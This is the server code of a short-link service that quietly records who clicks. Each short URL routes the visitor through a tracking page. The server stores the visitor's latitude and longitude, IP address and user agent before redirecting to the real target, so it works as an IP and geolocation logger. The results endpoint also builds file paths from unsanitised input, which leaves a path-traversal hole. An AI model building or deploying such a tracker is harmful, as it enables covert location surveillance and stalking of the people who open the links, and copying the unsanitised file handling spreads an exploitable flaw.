const express = require('express');
const app = express();
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Middleware
app.use(express.json());
app.use(express.static('public'));

// In-memory storage for tracking data
const trackingData = {};

// Create data directory if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Ensure directories exist
const publicDir = path.join(__dirname, 'public');
fs.mkdirSync(publicDir, { recursive: true });

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Redirect root to index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate unique tracking ID
// Generate short tracking ID (6 characters)
function generateTrackingId() {
    return crypto.randomBytes(3).toString('hex');
}

// Generate a short URL path (4 characters)
function generateShortPath() {
    return crypto.randomBytes(2).toString('hex');
}

// Store mappings and data
const urlMappings = new Map();
const originalUrls = new Map();
const shortToLongId = new Map();

// Load existing mappings if they exist
try {
    if (fs.existsSync(path.join(dataDir, 'mappings.json'))) {
        const mappings = JSON.parse(fs.readFileSync(path.join(dataDir, 'mappings.json'), 'utf8'));
        urlMappings.clear();
        originalUrls.clear();
        shortToLongId.clear();
        
        mappings.urlMappings.forEach(([key, value]) => urlMappings.set(key, value));
        mappings.originalUrls.forEach(([key, value]) => originalUrls.set(key, value));
        mappings.shortToLongId.forEach(([key, value]) => shortToLongId.set(key, value));
    }
} catch (error) {
    console.error('Error loading mappings:', error);
}

// API Routes

app.post('/api/create', (req, res) => {
    const { targetUrl } = req.body;
    if (!targetUrl) {
        return res.status(400).json({ error: 'Target URL is required' });
    }

    const trackingId = generateTrackingId();
    const shortPath = generateShortPath();
    trackingData[trackingId] = [];
    
    // Save initial empty data
    fs.writeFileSync(
        path.join(dataDir, `${trackingId}.json`),
        JSON.stringify([], null, 2)
    );

    // Store mappings
    urlMappings.set(shortPath, trackingId);
    originalUrls.set(trackingId, targetUrl);
    shortToLongId.set(shortPath, trackingId);

    // Save mappings to file
    fs.writeFileSync(
        path.join(dataDir, 'mappings.json'),
        JSON.stringify({
            urlMappings: Array.from(urlMappings.entries()),
            originalUrls: Array.from(originalUrls.entries()),
            shortToLongId: Array.from(shortToLongId.entries())
        }, null, 2)
    );
    
    // Create URLs
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const shortUrl = `${baseUrl}/t/${shortPath}`;
    const fullUrl = `${baseUrl}/track.html?id=${trackingId}`;
    
    res.json({
        trackingId,
        shortUrl,
        fullUrl,
        originalUrl: targetUrl
    });
});

// Handle short URL redirects
app.get('/t/:shortPath', (req, res) => {
    const { shortPath } = req.params;
    const trackingId = urlMappings.get(shortPath);
    
    if (!trackingId) {
        return res.status(404).send('Link not found');
    }
    
    // First redirect to tracking page, which will then redirect to original URL
    res.redirect(`/track.html?id=${trackingId}`);
});

// Get original URL for tracking page
app.get('/api/original-url/:id', (req, res) => {
    const { id } = req.params;
    const originalUrl = originalUrls.get(id);
    
    if (!originalUrl) {
        return res.status(404).json({ error: 'URL not found' });
    }
    
    res.json({ url: originalUrl });
});

app.post('/api/track/:id', (req, res) => {
    const { id } = req.params;
    const { latitude, longitude, error } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!trackingData[id]) {
        return res.status(404).json({ error: 'Tracking ID not found' });
    }

    const trackingEvent = {
        timestamp: new Date().toISOString(),
        location: error ? `IP: ${clientIP}` : `${latitude}, ${longitude}`,
        userAgent: req.headers['user-agent'],
        ip: clientIP
    };

    if (!error && latitude && longitude) {
        trackingEvent.latitude = latitude;
        trackingEvent.longitude = longitude;
    }

    trackingData[id].push(trackingEvent);
    
    // Save to file
    fs.writeFileSync(
        path.join(dataDir, `${id}.json`),
        JSON.stringify(trackingData[id], null, 2)
    );

    res.json({ success: true });
});

// Load existing mappings if they exist
try {
    if (fs.existsSync(path.join(dataDir, 'mappings.json'))) {
        const mappings = JSON.parse(fs.readFileSync(path.join(dataDir, 'mappings.json'), 'utf8'));
        urlMappings.clear();
        originalUrls.clear();
        shortToLongId.clear();
        
        mappings.urlMappings.forEach(([key, value]) => urlMappings.set(key, value));
        mappings.originalUrls.forEach(([key, value]) => originalUrls.set(key, value));
        mappings.shortToLongId.forEach(([key, value]) => shortToLongId.set(key, value));
    }
} catch (error) {
    console.error('Error loading mappings:', error);
}

// Get tracking ID from short path
function getTrackingId(id) {
    // First try to get from shortToLongId
    const longId = shortToLongId.get(id);
    if (longId) return longId;
    
    // Then try urlMappings
    const mappedId = urlMappings.get(id);
    if (mappedId) return mappedId;
    
    // Finally, assume it's a full tracking ID
    return id;
}

app.get('/api/results/:id', (req, res) => {
    const { id } = req.params;
    const trackingId = getTrackingId(id);
    const dataPath = path.join(dataDir, `${trackingId}.json`);
    
    if (!fs.existsSync(dataPath)) {
        return res.status(404).json({ error: 'Tracking ID not found' });
    }

    try {
        const data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
        trackingData[trackingId] = data; // Update in-memory data
        
        // Include original URL in response if available
        const originalUrl = originalUrls.get(trackingId);
        res.json({
            data,
            originalUrl
        });
    } catch (error) {
        console.error('Error reading tracking data:', error);
        res.status(500).json({ error: 'Failed to read tracking data' });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
